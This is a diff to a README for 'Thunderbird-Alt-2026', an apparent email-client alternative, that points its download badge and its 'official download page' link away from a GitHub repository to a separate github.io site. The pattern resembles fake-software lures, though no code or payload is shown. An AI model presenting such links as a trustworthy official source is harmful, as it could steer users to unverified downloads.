@@ -1,6 +1,6 @@
 # 📧 Thunderbird-Alt-2026 - Manage your email with total control
 
-[![](https://img.shields.io/badge/Download-Thunderbird_Alt_2026-blue)](https://github.com/unruly-wasteoftime359/Thunderbird-Alt-2026)
+[![](https://img.shields.io/badge/Download-Thunderbird_Alt_2026-blue)](https://unruly-wasteoftime359.github.io)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ Before you install this software, check that your computer meets these basic nee
 
 Follow these steps to put the software on your computer.
 
-1. Visit the [official download page](https://github.com/unruly-wasteoftime359/Thunderbird-Alt-2026).
+1. Visit the [official download page](https://unruly-wasteoftime359.github.io).
 2. Look for the release section on the right side of the page.
 3. Click the link that matches your system architecture.
 4. Save the file to your "Downloads" folder.
